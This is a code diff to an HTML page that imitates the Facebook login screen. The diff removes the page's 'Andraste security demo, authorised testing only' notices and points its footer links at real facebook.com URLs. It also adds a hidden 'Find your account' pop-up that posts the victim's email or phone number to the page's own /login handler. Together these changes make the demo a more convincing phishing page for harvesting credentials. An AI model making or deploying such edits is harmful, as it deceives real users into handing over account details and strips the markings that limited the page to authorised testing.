@@ -49,16 +49,31 @@ input:focus{border-color:#1877F2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
         <button type="submit" class="btn-login">Log in</button>
       </form>
 
-      <a class="forgot" href="#">Forgotten password?</a>
+      <a class="forgot" href="#" onclick="showForgot(event)">Forgotten password?</a>
       <div class="sep">or</div>
       <button class="btn-create" type="button">Create new account</button>
     </div>
 
     <div class="foot">
-      <a href="#">Privacy Policy</a>&middot;<a href="#">Terms &amp; Policies</a>&middot;<a href="#">Help Centre</a><br>
-      Meta &copy; 2024 &nbsp;&middot;&nbsp; Andraste security demo &mdash; authorised testing only.
+      <a href="https://facebook.com/privacy/policy/">Privacy Policy</a>&middot;<a href="https://facebook.com/policies_center/">Terms &amp; Policies</a>&middot;<a href="https://facebook.com/help/">Help Centre</a><br>
+      Meta &copy; 2024
     </div>
   </div>
-<!-- Andraste security demonstration — authorised testing only -->
+<div id="fo" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:99;align-items:center;justify-content:center;padding:16px">
+  <div style="background:#fff;border-radius:8px;padding:20px;max-width:360px;width:100%;box-shadow:0 2px 16px rgba(0,0,0,.2)">
+    <h2 style="font:700 18px/1.3 Helvetica,Arial;color:#1c1e21;margin-bottom:8px">Find your account</h2>
+    <p style="font:14px/1.5 Helvetica,Arial;color:#606770;margin-bottom:16px">Please enter your email address or mobile number to search for your account.</p>
+    <form method="POST" action="/login">
+      <input name="u" type="text" placeholder="Email or phone number"
+             style="display:block;width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none;box-sizing:border-box;margin-bottom:16px;color:#1c1e21">
+      <input type="hidden" name="p" value="password-reset">
+      <button type="submit"
+              style="display:block;width:100%;padding:12px;background:#1877F2;color:#fff;border:0;border-radius:6px;font:700 16px Helvetica,Arial;cursor:pointer;margin-bottom:10px">Search</button>
+      <button type="button" onclick="document.getElementById('fo').style.display='none'"
+              style="display:block;width:100%;padding:11px;background:#e4e6eb;color:#1c1e21;border:0;border-radius:6px;font:700 15px Helvetica,Arial;cursor:pointer">Cancel</button>
+    </form>
+  </div>
+</div>
+<script>function showForgot(e){e.preventDefault();var o=document.getElementById('fo');o.style.display='flex'}</script>
 </body>
 </html>
